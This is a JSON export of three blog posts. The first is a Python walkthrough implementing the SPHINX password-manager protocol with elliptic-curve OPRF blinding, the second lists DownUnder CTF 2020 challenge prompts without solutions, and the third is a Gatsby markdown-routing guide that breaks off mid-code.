{
  
    
        "post0": {
            "title": "Sphinx Algorithm Explained",
            "content": "import ecdsa.ellipticcurve as ecc import ecdsa.numbertheory as nt . Preliminary: Diffie Hellman Shared Secret . Elliptic Cryptography is based on the Discrete Logarithm Problem. In essense, we can simplify the idea to . Adding is easy on elliptic curves, but undoing addition seems hard . More formally, we can give the following definition:Let $G$ be an additive group, and let $x,y$ be elements of $G$ so that $x=ny$ for some integer $n$. The Discrete Logarithm Problem asks one to find $n$ when given $x$ and $y$. In integers, this problem is quite easy. If I have: . $x=12$ | $y=4185072$ | . Then, I can compute that $y=41805072=348756*12=348756x rightarrow n=348756$. . Division for integers is efficient, but for elliptic curves this is not the case. . Here is a toy problem testing my understanding of DH&#39;s shared secret protocol. . def sendDH(privateKey, generator, sendFunction): return sendFunction(privateKey * generator) def receiveDH(privateKey, receiveFunction): return privateKey * receiveFunction() prime = 3851 a = 324 b = 1287 myCurve = ecc.CurveFp(prime, a, b, 1) basePoint = ecc.Point(myCurve, 920, 303) . aliceSecretKey = 233 # generateSecretKey(8) bobSecretKey = 25 # generateSecretKey(8) alicePublicKey = sendDH(aliceSecretKey, basePoint, lambda x:x) bobPublicKey = sendDH(bobSecretKey, basePoint, lambda x:x) sharedSecret1 = receiveDH(bobSecretKey, lambda: alicePublicKey) sharedSecret2 = receiveDH(aliceSecretKey, lambda: bobPublicKey) . print(myCurve) print(basePoint) print(&#39;Shared secret is %s == %s&#39; % (sharedSecret1, sharedSecret2)) . CurveFp(p=3851, a=324, b=1287, h=1) (920,303) Shared secret is (1001,3826) == (1001,3826) . Algorithm Overview . Steps to implement . Hashing password into elliptic curve . PWD entered by user | SHA-256 computation, hashing into the NIST P-256 Curve | this is computed on input + iteration_counter $ rightarrow Z_q$. | computed value is considered $x$ coord of a point on curve if $y$-value is associated with it is a quadratic residue (i.e. $x,y$ satisfy the curve equation). | this is repeated until a curve element is obtained. (which is the output) | Password is concatenated with domain name and input into H&#39;. (ADD RESISTANCE AGAINST PHISHING) | . | FK-PTR OPRF protocol EXTENSION: Blind the password with OPRF OPRF: $F_k(x)=H(x,(H&#39;(x))^k)$ input $x$ from client | $k$ is from device | H maps from arbitrary length string $ rightarrow e in {0,1 }^ tau$, $ tau$ is a security parameter Looking at the formula for OPRF, we assume that H(xbytearray, point in G) = $H(x || P_x || P_y)$ | . | H&#39; maps from arbitrary length string $ rightarrow g in G$ H&#39; is the &quot;Hash into Elliptic Curve&quot; function, which maps the password into a point on NIST P-256 curve | . | . | works over a group $G$ of prime order $p$ (e.g. NIST P-256 group) | . | extension picks a random number $ rho in Z_q$ and raises the hash value of the input to the power $ rho$. this blinding factor $ rho$ hides the password with information-theoretic security) SEND THIS AS $ alpha$ | . | . | DEVICE check if $ alpha$ is $ in G$ | compute and SEND BACK $ beta = alpha^k$ | . | BACK TO EXTENSION check if $ beta$ is $ in G$ | raise the recieved value to the power of $ rho^{-1} in Z_q$ | then compute the SHA-256 hash of calculated value. | . | BACK TO RWD PASSWORD (same as PwdHash implementation) | encoded to a random combination of letters, numbers and symbols matching the passwrod requirement of the visited website and entered into pwd field of login page. | . | | N.B. . taking the exponential in a group is just repetition of the operation i.e. $ forall x in G, n in Z, x^n = underbrace{x+...+x}_ text{n times}$. | see this crypto stack exchange thread | . | how to take the inverse power in a group Raise the point to the power $a^{-1} in Z_p$ | this is fairly easy to do with euclidean algorithm | see stack exchange link for more info | . | Instantiation assumes a cyclic group $G$ of prime order $q$, $|q|= tau$, with generator $g$. At init, User chooses master password pwd, while Device chooses and stores $k leftarrow Z_q$. | . | H which looks like it accepts two arguments when it&#39;s called in $H(x, (H&#39;(x))^k)$ really just means hash it all at once, by appending it. in the paper, it describes this step as &quot;Client hashes this value $(H&#39;(pwd|domain))^k$ with the pwd to obtain rwd&quot; | in the implementation, they use crypto_generichash_update() from source. | furthermore, in the documentation for &lt;sodium.h&gt; they use this function to compute the hash on a multi-part example | there is a reddit thread which also explains how the function used can be used to hash variable length things such as a stream | . | the notation of $ {0,1 }^ tau$ means a bit string of length $ tau$ From this paper on hashing into Elliptic Curves, they describe the following notation: &quot;bitstring of arbitrary length is denoted as $ {0, 1 }^*$&quot; | . | . | octet means base-256, and not to be confused with octal which is base-8 | . Curve definition . Using the primitives from ecdsa package in python, we will create the following curve based on the parameters for P-256. . # NIST Curve P-256: # ORDER = 115792089210356248762697446949407573529996955224135760342422259061068512044369 PRIME = 115792089210356248762697446949407573530086143415290314195533631308867097853951 R = 115792089210356248762697446949407573529996955224135760342422259061068512044369 # s = 0xc49d360886e704936a6678e1139d26b7819f7e90L # c = 0x7efba1662985be9403cb055c75d4f7e0ce8d84a9c5114abcaf3177680104fa0dL A = -3 B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B Gx = 0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296 Gy = 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5 curve_256 = ecc.CurveFp(PRIME, A, B, 1) curve_256_generator = ecc.PointJacobi(curve_256, Gx, Gy, 1, R, generator=True) . 1. Hashing password into elliptic curve . 1.1 HashToBase Implementation . Here is a definition of the function: HashToBase(x): $H(x)[0:log_2(p) + 1]$, i.e., hash-truncate-reduce, where H is a cryptographic hash function, such as SHA256, and $p$ is the prime order of base field $F_p$. Here is some psuedo code: . HashToBase(x, i) Parameters: H - cryptographic hash function to use hbits - number of bits output by H p - order of the base field Fp label - context label for domain separation Preconditions: floor(log2(p)) + 1 &gt;= hbits Input: x - value to be hashed, an octet string i - hash call index, a non-negative integer Output: y - a value in the field Fp Steps: 1. t1 = H(&quot;h2c&quot; || label || I2OSP(i, 4) || x) 2. t2 = OS2IP(t1) 3. y = t2 (mod p) 4. Output y where I2OSP, OS2IP [RFC8017] are used to convert an octet string to and from a non-negative integer, and a || b denotes concatenation of a and b. . from binascii import hexlify, unhexlify from hashlib import sha1, sha256, sha384, sha512 import hashlib from ecdsa import NIST256p # http://www.secg.org/sec2-v2.pdf # print(NIST256p.oid) ORDER = NIST256p.order # https://github.com/bdauvergne/python-pkcs1/blob/master/pkcs1/primitives.py def OS2IP(x: str) -&gt; int: &#39;&#39;&#39;Converts the byte string x representing an integer reprented using the big-endian convient to an integer. &#39;&#39;&#39; h = hexlify(x) #.binascii return int(h, 16) # https://github.com/bdauvergne/python-pkcs1/blob/master/pkcs1/primitives.py def I2OSP(x: int, x_len: int = 4) -&gt; str: &#39;&#39;&#39;Converts the integer x to its big-endian representation of length x_len. &#39;&#39;&#39; if x &gt; 256**x_len: raise ValueError(&quot;Integer too large.&quot;) h = hex(x)[2:] if h[-1] == &#39;L&#39;: h = h[:-1] if len(h) &amp; 1 == 1: h = &#39;0%s&#39; % h x = unhexlify(h) #.binascii return b&#39; x00&#39; * int(x_len-len(x)) + x print(&quot;OCT TEST: I2OSP(23) = {}, and then OS2IP(I2OSP(23)) = {}&quot;.format(I2OSP(23, 4), OS2IP(I2OSP(23, 4)))) # https://tools.ietf.org/html/draft-irtf-cfrg-hash-to-curve-02#appendix-C.5 def HashToBase(x: bytearray, i: int, label: str=&quot;label&quot;, p: int=ORDER) -&gt; int: &#39;&#39;&#39;Hashes the bytearray x with a label string, the hash call index i, and returns y, a value in the field F_p &#39;&#39;&#39; H = sha256() toHash = [&quot;h2c&quot;, label, I2OSP(i, 4), x] H.update(b&quot;hc2&quot;) H.update(label.encode()) # H.update(I2OSP(i,4)) H.update(str(i).encode()) H.update(x) t1 = H.digest() t2 = OS2IP(t1) return (t2 % p) # = y valueToBeHashed = 23 hashCallIndex = 11 print(PRIME) print(ORDER) print(&quot;HashToBase(I2OSP({})={}, {}) = {}&quot;.format(valueToBeHashed, I2OSP(valueToBeHashed), hashCallIndex, HashToBase(I2OSP(valueToBeHashed), hashCallIndex) )) . OCT TEST: I2OSP(23) = b&#39; x00 x00 x00 x17&#39;, and then OS2IP(I2OSP(23)) = 23 115792089210356248762697446949407573530086143415290314195533631308867097853951 115792089210356248762697446949407573529996955224135760342422259061068512044369 HashToBase(I2OSP(23)=b&#39; x00 x00 x00 x17&#39;, 11) = 52666019840208479355183598407159392888009956878866650321053742936543132317912 . 1.2 Simplified SWU Method (5.2.3.) . As per the hashing into elliptic curves paper, for P-256 curve, we should use Simple SWU. . The following map2curve_simple_swu(alpha) implements the simplified Shallue-Woestijne-Ulas algorithm from [SimpleSWU]. This algorithm works for any curve over F_{p^n}, where p = 3 mod 4, including: o P256 o ... . Given curve equation $g(x) = x^3 + Ax + B$, this algorithm works as follows: . t = HashToBase( alpha) | $ alpha = frac{-b}{a} * (1+ frac{1}{t^4 + t^2})$ | $ beta = -t^2 * alpha$ | If $g( alpha)$ is square, output $( alpha, sqrt{g( alpha)})$ | Output $( beta, sqrt{g( beta)})$ | The following procedure implements this algorithm. It outputs a point with affine coordinates. It requires knowledge of A and B, the constants from the curve Weierstrass form. . map2curve_simple_swu(alpha) Input: alpha - value to be encoded, an octet string Output: (x, y) - a point in E Steps: 1. t = HashToBase(alpha) 2. alpha = t^2 (mod p) 3. alpha = alpha * -1 (mod p) 4. right = alpha^2 + alpha (mod p) 5. right = right^(-1) (mod p) 6. right = right + 1 (mod p) 7. left = B * -1 (mod p) 8. left = left / A (mod p) 9. x2 = left * right (mod p) 10. x3 = alpha * x2 (mod p) 11. h2 = x2 ^ 3 (mod p) 12. i2 = x2 * A (mod p) 13. i2 = i2 + B (mod p) 14. h2 = h2 + i2 (mod p) 15. h3 = x3 ^ 3 (mod p) 16. i3 = x3 * A (mod p) 17. i3 = i3 + B (mod p) 18. h3 = h3 + i3 (mod p) 19. y1 = h2 ^ ((p + 1) / 4) (mod p) 20. y2 = h3 ^ ((p + 1) / 4) (mod p) 21. e = CTEQ(y1 ^ 2, h2) // Constant-time equality 22. x = CMOV(x2, x3, e) // If e = 1, choose x2, else choose x3 23. y = CMOV(y1, y2, e) // If e = 1, choose y1, else choose y2 24. Output (x, y) . Helper functions . o CMOV(a, b, c): If c = 1, return a, else return b. Common software implementations of constant-time selects assume c = 1 or c = 0. CMOV may be implemented by computing the desired selector (0 or 1) by ORing all bits of c together. The end result will be either 0 if all bits of c are zero, or 1 if at least one bit of c is 1. o CTEQ(a, b): Returns a == b. Inputs a and b must be the same length (as bytestrings) and the comparison must be implemented in constant time. . print(&quot;CHECK: ensure p = {} = 3 mod 4, {}mod4 = 3mod4: {} n&quot;.format(PRIME, PRIME%4, PRIME%4==3)) # https://tools.ietf.org/html/draft-irtf-cfrg-hash-to-curve-02#section-5.2.3 # Implementation of H&#39; which maps from bytearray -&gt; g in G def map2curve_simple_swu(alpha: bytearray) -&gt; (int, int): &#39;&#39;&#39;Maps the octet bytearray alpha into the elliptic curve, and returns a point from the elliptic curve. &#39;&#39;&#39; t = HashToBase(alpha, 1) alpha = pow(t, 2, PRIME) alpha = -alpha % PRIME right = (pow(alpha, 2, PRIME) + alpha) % PRIME right = pow(right, PRIME-2, PRIME) # right^(-1) % PRIME right = (right + 1) % PRIME left = -B % PRIME left = (left * pow(A, PRIME-2, PRIME)) % PRIME # (left * A^-1) % PRIME x2 = (left * right) % PRIME x3 = (alpha * x2) % PRIME h2 = pow(x2, 3, PRIME) # x2 ^ 3 % PRIME i2 = (x2 * A) % PRIME i2 = (i2 + B) % PRIME h2 = (h2 + i2) % PRIME h3 = pow(x3, 3, PRIME) # x3 ^ 3 % PRIME i3 = (x3 * A) % PRIME i3 = (i3 + B) % PRIME h3 = (h3 + i3) % PRIME y1 = pow(h2, (PRIME+1) // 4, PRIME) # h2 ^ ((p + 1) / 4) % PRIME y2 = pow(h3, (PRIME+1) // 4, PRIME) # h3 ^ ((p + 1) / 4) % PRIME if pow(y1, 2, PRIME) == h2: return ecc.Point(curve_256, x2, y1) else: return ecc.Point(curve_256, x3, y2) # Implemented via the Simple SWU paper: https://eprint.iacr.org/2009/340.pdf # 1. alpha = -t^2 # 2. X2 = -B/A * (1 + 1/(alpha^2 + alpha)) # 3. X3 = alpha*X2 # 4. h2 = g(X2), h3 = g(x3), if g(x) = x^3 + Ax + B # 5. if h2 is square, return (X2, sqrt(g(X2))), else return (X3, sqrt(g(X3))) def my_swu(alpha: bytearray, debug: bool=False) -&gt; (int, int): # 1. alpha = -t^2 t = HashToBase(alpha,1) print(&quot;0. HashToBase(alpha)= t t t&quot;, t) if debug else None alpha = (-pow(t, 2, PRIME)) % PRIME print(&quot;1. alpha=-t^2= t t t t&quot;, alpha) if debug else None #X2 = -B/A * (1 + 1/(alpha^2 + alpha)) X2_left = -B % PRIME X2_left = (X2_left * pow(A, PRIME-2, PRIME)) % PRIME # X2_left = 52283484311836130297341192243151613979733528143761346583456295874302188418414 print(&quot;2.1 X2_left=-B/A= t t t&quot;, X2_left) if debug else None X2_right = (alpha+1) % PRIME X2_right = (X2_right*alpha) % PRIME X2_right = pow(X2_right, PRIME-2, PRIME) X2_right = (X2_right + 1) % PRIME print(&quot;2.2 X2_right=1+1/(alpha^2+alpha)= t&quot;, X2_right) if debug else None X2 = (X2_left * X2_right) % PRIME print(&quot;2.3 X2= t t t t&quot;, X2) if debug else None # X3 = alpha*X2 X3 = (alpha*X2) % PRIME print(&quot;3. X3=alpha*X2= t t t&quot;, X3) if debug else None # h2 = g(X2), h3 = g(x3), if g(x) = x^3 + Ax + B h2 = (pow(X2, 3, PRIME) + (A * X2)%PRIME + B) % PRIME h3 = (pow(X3, 3, PRIME) + (A * X3)%PRIME + B) % PRIME print(&quot;4.1 g(X2)= t t t t&quot;, h2) if debug else None print(&quot;4.2 g(X3)= t t t t&quot;, h3) if debug else None sh2 = pow(h2, (PRIME+1)//4, PRIME) sh3 = pow(h3, (PRIME+1)//4, PRIME) print(&quot;5.1 sqrt(g(X2))= t t t&quot;, sh2) if debug else None print(&quot;5.2 sqrt(g(X3))= t t t&quot;, sh3) if debug else None if pow(sh2, 2, PRIME) == h2: print(&quot;X2, sh2^2 = h2&quot;) if debug else None return ecc.Point(curve_256, X2, sh2) else: print(&quot;X3, sh3^2 = h3? {}&quot;.format(pow(sh3,2,PRIME) == h3)) if debug else None return ecc.Point(curve_256, X3, sh3) . CHECK: ensure p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 = 3 mod 4, 3mod4 = 3mod4: True . 1.2.1 Testing Correctness . Testing the SWU&#39;s implementation vs HashToBase&#39;s implementation, and showing it can successfully hash into the curve with all inputs range(0, test_cases) . test_cases = 30 correct = 0 correct_list = [] for test in range(test_cases): p = map2curve_simple_swu(I2OSP(test)) if curve_256.contains_point(p.x(), p.y()): correct += 1 correct_list.append(test) print(&quot;correct: {}, are {}&quot;.format(correct, correct_list)) . correct: 30, are [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29] . test_cases = 30 correct = 0 correct_list = [] for test in range(test_cases): p = my_swu(I2OSP(test)) if curve_256.contains_point(p.x(), p.y()): correct += 1 correct_list.append(test) print(&quot;correct: {}, are {}&quot;.format(correct, correct_list)) . correct: 30, are [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29] . 1.3 Usage of SWU . print(map2curve_simple_swu(b&quot;passwordwww.facebook.com&quot;)) # or you can use the og swu implementation print(my_swu(b&quot;passwordwww.facebook.com&quot;)) . (50560896577634328033374378148020771698070026914100043083631439008968958738601,96434689098651036750287593872426977420942250920898794682863763170885260996734) (50560896577634328033374378148020771698070026914100043083631439008968958738601,96434689098651036750287593872426977420942250920898794682863763170885260996734) . 2 SPHINX architecture . steps to reproduce . Notes: . x is a byte array | $g in G$ | . client(x: bytearray) -&gt; Point: takes $x=masterpassword || domainname$ | calculates $H&#39;(x)$: bytearray -&gt; $P(x,y) in G$ | picks a random number $ rho$ | calculates and returns the blinded result $ alpha = H&#39;(x)^ rho$ | . | device($ alpha$: Point) -&gt; Point: checks if $ alpha$ is in group $G$ | retrieves (or creates and store) $d$ in database | calculates and returns $ beta = alpha^d$ | . | client( beta: Point) -&gt; bytearray: checks if $ beta$ is in group $G$ | calculates $ beta^ frac{1}{ rho}$ and unblinds the result | calculates and returns H(x || beta^(1/ rho)) | . | x = &quot;masterpasswordwww.google.com&quot; hdashx = map2curve_simple_swu(x.encode()) print(&quot;H&#39;(x):&quot;) print(hdashx) print(hex(hdashx.x()), hex(hdashx.y())) rho = 23 # generate a random number here alpha = hdashx * rho # hdashx^rho print(&quot;alpha = (H&#39;(x))^rho:&quot;) print(alpha) print(hex(alpha.x()), hex(alpha.y())) . H&#39;(x): (9647045120380072016896367801436216089517385294113691900224368540592147852881,63780912247584663447060568763839704993950614958143814955131411688625580648907) 0x155408b6f6f87082d9d97dbb4d9322e279709ae7e591ec2a2cd02db7e548ee51 0x8d02b7900d4d11105589f57d5c2b8a871f372b26a0c1464b884671c6dad9a9cb alpha = (H&#39;(x))^rho: (96060363318793445308142303247957725785598212468546760216643989368154363422182,67253679145713470788686215502821137612357123005677477254415963606436937150077) 0xd4603d2897e719a966dd41810e0d547f8e5141bb24b02792af8a4f0b401665e6 0x94b03bc36fb71a95dc6c50198870a85f7f0d52e0f0fb5ee0fdd41d09f3c72e7d . assert (curve_256.contains_point(alpha.x(), alpha.y()) == True) d = HashToBase(b&quot;some random way to produce this d key&quot;, 1) print(&quot;d = &quot;, d) print(hex(d)) beta = d * alpha print(&quot;beta = alpha^d:&quot;) print(beta) print(hex(beta.x()), hex(beta.y())) . d = 49593046683349734658837698885206452611033450058247891428920244266019060051104 0x6da4ab71e4602e1eb332ad0143eddb1ba07bd258ed2716a4f9271821e6a5eca0 beta = alpha^d: (20902386769593356422803755726142762975644522947047497806519940156789227647566,37820471632289113646378000102094571407461625006655530832469911478145755153402) 0x2e3654e7b2bf3d4ff2ad21cdfc9f73670a42bf5a807e799e726ebd048f91f24e 0x539da0dc00fcea9ef0d42ec0fca00aafad897c01e1ba5cf901992ac4f67883fa . assert (curve_256.contains_point(beta.x(), beta.y()) == True) # n.b. print(&quot;rho^-1 * rho = &quot;,pow(rho, PRIME-2, PRIME) * rho % PRIME) final = beta * pow(rho, ORDER-2, ORDER) print(&quot;final = beta^(1/rho)&quot;) print(final) print(hex(final.x()), hex(final.y())) . rho^-1 * rho = 1 final = beta^(1/rho) (34550786935032766327755133052490331274309469427745266322787923543983364811861,49690625575606612910815333321718443879931197308857771898142620989441619363396) 0x4c630d6a1aea8b7ff03f4c9996dd21f978f9609eb387b3bb7b73b20ce694ac55 0x6ddbe5bc2a5b6a1514a6b6b7a1340ce4debe089a530c5b5cee2ba720b6b58644 . check_final = hdashx * d print(check_final) assert (curve_256.contains_point(check_final.x(), check_final.y()) == True) print(&quot;Check that this result `check final` equals `final`:&quot;) print (check_final == final) . (34550786935032766327755133052490331274309469427745266322787923543983364811861,49690625575606612910815333321718443879931197308857771898142620989441619363396) Check that this result `check final` equals `final`: True . # Oblivious Psuedo-Random Function def OPRF(x: str, point: ecc.Point) -&gt; bytearray: &#39;&#39;&#39;Performs the actual Hash H of H(x, (H&#39;(X))^d), which is the hash of a bytearray x and a Point on the curve. Returns a bytearray result. &#39;&#39;&#39; H = sha256() H.update(x.encode()) H.update(I2OSP(point.x(), 256)) H.update(I2OSP(point.y(), 256)) return H.digest() rwdbytes = OPRF(x, final) print(rwdbytes, len(rwdbytes)) # convert this to a password import os def gen_password(rwd: bytearray, length: int=32, charset: str=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()&quot;) -&gt; str: &#39;&#39;&#39;Generates the password based on the result of the OPRF function &#39;&#39;&#39; len_charset = len(charset) indices = [int(len_charset * (ord(chr(byte)) / 256.0)) for byte in rwd] return &quot;&quot;.join([charset[index] for index in indices]) print(&quot;Your facebook password is: &quot;, gen_password(rwdbytes)) . b&#34; xec xf8J xf9 xd7 xe6 xa9e xa5h x1duj x16 x91&#39;&#39; xd4 xe4 x89 x1c xc9 xef xfeo} x17 xb7 x10 x8d.$&#34; 32 Your facebook password is: %*U(8#vcudIgdGoKK7#mH4^)fjGzEnMK . 2.1 Overview . Here is all the basic functionality of the each part captured as a function. . They follow the naming convension &quot;AToB&quot;, where A is the current Entity (Client, Device), as shown below. . x = &quot;masterpasswordwww.google.com&quot; # Client 1 def clientToPoint(x: str) -&gt; ecc.Point: &#39;&#39;&#39;input the master password pwd and returns a point on the curve alpha with the random integer that was used to blind it. &#39;&#39;&#39; hdashx = map2curve_simple_swu(x.encode()) rho = OS2IP(os.urandom(32)) return hdashx * rho # alpha = hdashx^rho # Device def deviceToClient(alpha: ecc.Point, index: int=1) -&gt; ecc.Point: &#39;&#39;&#39;input the point on the curve. If it is in the Group, we store a random key D that corresponds to this point, and return the point exponeniated to D. &#39;&#39;&#39; if curve_256.contains_point(alpha.x(), alpha.y()) != True: return 0 print(&quot;ALPHAS: &quot;, hex(alpha.x()), hex(alpha.y())) randomBytes = os.urandom(32) d = HashToBase(randomBytes, index) print(&quot;DEVICE: I am going to store d: &quot;, d) return d * alpha # beta = alpha^d #Client 2 def clientToPassword(beta: ecc.Point) -&gt; str: &#39;&#39;&#39;input the point on the curve. If it is in the Group, we compute this point exponeniated to the inverse of rho, and then we use the OPRF to create the byte array which generates the final password rwd &#39;&#39;&#39; if curve_256.contains_point(beta.x(), beta.y()) != True: return 0 final = beta * pow(rho, ORDER-2, ORDER) print(&quot;FINAL: &quot;, hex(final.x()), hex(final.y())) rwdbytes = OPRF(x, final) return gen_password(rwdbytes, charset=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()&quot;) # Usage # Start Client alpha = clientToPoint(x) # End Client # send alpha to Device # Start Device beta = deviceToClient(alpha) # End Device # send beta to Client # Start Client rwd = clientToPassword(beta) print(&quot;CLIENT: my password is&quot;, rwd) # End Client . ALPHAS: 0x6d68db7cb3dc8e41218e21c99686a1c4b15f4b28b042c20e9cf1a5ec4269f77a 0x6caf2ff7e2661f15eabc9b92dac5c99847ee9af38eade284e2fe4dcdc41246cf DEVICE: I am going to store d: 39293753817579684587358563962791485292162063136866083282799165565461415876781 FINAL: 0x7e5b03b2c70b79dbf3ebee465c1af0dacf48abb1659a26251cf90c9324da7d43 0x7ef85457e3fa4289a7b49cd37d6ca2b285fd51ad68433a70598cad63033cb52b CLIENT: my password is 5tce4XdQQHobplMPqhfUIwtR%RbOnlAw . 2.2 Issues I ran Into during Implementation . Here is a collection of issues I&#39;ve ran into over the past week about my implementation experience, having basically no experience in cryptography and trying to play around with elliptic curves. . Implementing Octet String &lt;-&gt; Integer Primitives In order to implement HashToBase, I had to first implement these primitive functions. I looked at the papers but had trouble figuring out what I had to implement, and the implementation presented in the second paper was not very helpful in terms of how to actually implement it. it said stuff like, &quot;convert x to it&#39;s base 256 form such that x = x_{i-1} 256^{i-1} + ... + x_1 256 + x_0&quot; | . | I was wondering, Do I need to actually calculate this value, when I&#39;ve read online that this is literally the byte representation of an integer (in python its called bytearray!) | Mixed up octet with octal, and when was sad when I realised I could not use the python built-in oct(). | . | HashToBase I was pretty confused with the notation of the hash function and how it accepted multiple arguments found out during week 4 tutorial and from personal research that you should concatenate it, but be careful of length extension attacks | many implementations of hash functions (for example, hashlib.sha256 in python), implement the hash function in a special way: myHash = hashlib.sha256(). # instantiation . | myHash.update(b&#39;This is the byte representation of something I want to hash&#39;) # update myHash.update(b&#39; , and you can keep hash multi-part lines like this&#39;) . | myHash.digest() # result of the hash is returned when you run digest . | I.e. use the update function sequentially to add multiple parts to the hash, this is done for multiple reasons encourage good standards, so people hash multiple arguments through the update() function rather than concatenating the strings before applying the hash | so that each call to hash runs in constant time, no need to worry about variable-length string hashing | . | . | . | . | Simple SWU modular arithmetic is very particular A // B is usually how you do integer division, however, this does not work for modular arithmetic. Use A * pow(B, PRIME-2, PRIME), where B^-1 % PRIME == pow(B, PRIME-2, PRIME) and PRIME mod 4 == 3 mod 4 is required. | . | make sure the entire result is enclosed in brackets before applying %PRIME or else you may only be applying modulo to part of the result | I was really just stuck on that first point for while, the algorithm was failing to hash 8/30 cases, and I was having a hard time figuring out why until I played around with genius, the cli calculator capable of modular arithmetic. | . | . | SPHINX I could not get the actual math to work, when I exponiated $ beta$ to the inverse of $ rho$, it was not equal to what the OPRF function dictated, when I knew that the paper said that this unblinding process should do so Make sure you know the difference between the prime number p of a Finite Integer Field Z_p, and the ORDER of Z_p. They are different numbers, It should be inverted w.r.t ORDER, not PRIME. | . | . | . 3. Further Work . This is basically most of the functionality of SPHINX completed in python. Now It will be time to prove that this concept works by implementing it into a working password store to demonstrate the power. I have a few ideas that also need to be implemented before I can go towards creating the front ends: . Have a configurable bytes to password generating system, for example, If passwords need to be a certain length or if they only contain certain characters. | .",
            "url": "https://blog.justinor.dev/jupyter/security/sphinx/somethingawesome/2021/05/06/sphinx-algorithm-overview.html",
            "relUrl": "/jupyter/security/sphinx/somethingawesome/2021/05/06/sphinx-algorithm-overview.html",
            "date": " • May 6, 2021"
        }
        
    
  
    
        ,"post1": {
            "title": "Down Under 2020 CTF writeup",
            "content": "Text goes here. . Forensics . Spot the Difference . 327 easy Author: TheDon . An employee’s files have been captured by the first responders. The suspect has been accused of using images to leak confidential infomation, steghide has been authorised to decrypt any images for evidence! . Files: https://storage.googleapis.com/files.duc.tf/uploads/SpotTheDifference/Publish.zip (sha256: be6fd22e658b51124da5a608cc50e5fdc6698772a024cfe4dd9fb393f6ee5227) . I Love Scomo . 440 medium . I really do love Scott Morrison! &lt;3 &lt;3 &lt;3 . However, some people don’t like me because of my secret crush :(. So I have to hide my secrets using steganography. This is my hidden space, where I can dream about being with Scomo and I really appreciate that no one tries to reveal my secret message for him. . Author: ghostccamm . Attached files: . ilovescomo.jpg (sha256: c1a820c8b17c179b93a1bdf677b01080a27cec2d130e58d50117ef669b4ab9af) . web . Web Badmin . 370 easy . Author: Blue Alder . We launched a game and now it is no longer launched :( can you figure out what happened plox. HALP . https://chal.duc.tf:30102 . crypto . babyrsa . 200 easy . Author: joseph . This is just RSA for babies! . Attached files: . babyrsa.py (sha256: 37676169a895f541454f4a93a943a7718c09bd245233e1fa38eb1f85181e3fe8) output.txt (sha256: b1a705ce9efd6403006b00ecccc8225e7e103b704dc276797eafa68d26fba068) . misc . In a pickle . 200 easy . Author: n00bmaster . We managed to intercept communication between und3rm4t3r and his hacker friends. However it is obfuscated using something. We just can’t figure out what it is. Maybe you can help us find the flag? . Addition . 200 easy . Author: n00bmaster . Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. His most recent project is a simple calculator which he reckons is super secure because of the “filters” he has in place. However, he thinks that he knows more than everyone around him. Put Joe in his place and grab the flag. . Pretty Good Pitfall . 200 easy . Author: k0wa1ski#6150 . PGP/GPG/GnuPG/OpenPGP is great! I reckon you can’t find the message, because it looks scrambled! . Attached files: flag.txt.gpg (sha256: dad03ac28b7294c8696eeac21d11159c3dcfc8ed226438804fe82b4fb9f6ad87) . Tim Tams . 273 easy . Author: QUT_WH . When I eat too many Tim Tams, I get rather slow! . WARNING You will want to turn down your audio for this one! . Download: https://storage.googleapis.com/files.duc.tf/uploads/Clive.wav . File Hash (SHA256): 4C1CC12D002956A83E168CA650B776B55AAC36F2131D0DF617BE7D55DBEF93D1 . Koala Habitat . 462 easy . Author: QUT_WH . What an Aussie Banger! . Flag Format: STRING you end up with after solving challenge –&gt; Spaces seperate the words . NO DUCTF{} required . Attached files: . gumtrees.wav (sha256: E80D485C8A6F3818F9946EDE5283CDF4CCF7276A02BE76EA23A88AF21DD15843) . OSINT . Welcome to Petstagram . 100 beginner . Who is Alexandros the cat exactly? And who is this mysterious “mum” he keeps talking about? . Submit his mum’s full name in lowercase and with underscores instead of spaces, as the flag: DUCTF{name} . Author: dahlia .",
            "url": "https://blog.justinor.dev/ctf/security/2020/09/19/downunder2020-ctf.html",
            "relUrl": "/ctf/security/2020/09/19/downunder2020-ctf.html",
            "date": " • Sep 19, 2020"
        }
        
    
  
    
        ,"post2": {
            "title": "Multiple blog types in Gatsby",
            "content": "graphql is was very confusing for me to use at first, but with the ___graphql tool available during gatsby develop, I found that I could quickly learn how it works as I used it more and more. One of the issues I came across lately was trying to maintain two different markdown folders for blogs and projects respectively. . From my research, I found another guide on how to do this, but their guide was for gatsby version 1, and I found that the requirement of providing metadata for project markdown files was a bit redundant, as you will see below. So here is my guide for creating a projects folder for your project markdown files to be serve on gatsby. . Criteria . You are using a set up similar to the the gatsby starter blog. | You want a file structure like this | . src ├── content │   ├── blog │   │   ├── blog1 │   │   │   └── index.md │   │   └── blog2 │   │   └── index.md │   └── projects │   ├── project1 │   │   └── index.md │   └── project2 │   └── index.md └── src    └── templates        ├── BlogPost.tsx       └── ProjectPost.tsx . Thats it! (nothing redundant like requiring a field to be added to each projects’ index.md…) . Setting up Gatsby . In gatsby-config.js, add the following code in the plugins array: . plugins: [ ... { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content/projects`, name: `projects`, }, }, ... ] . Next, in gatsby-node.js, we don’t need to change the graphql query at all! Instead, we need to conditionally create pages and nodes based on the path to the markdown files! . Assuming your graphql takes the fileAbsolutePath field from allMarkdownRemark / edges / nodes like so: . const result = await graphql( ` { allMarkdownRemark( sort: { fields: [frontmatter___date], order: DESC } limit: 1000 ) { edges { node { fields { slug } fileAbsolutePath frontmatter { title tags } } } } } ` ); . Then we can simply check this property to figure out whether to render this as a blog post or as a project post! . exports.createPages = async ({ graphql, actions }) =&gt; { const blogPost = 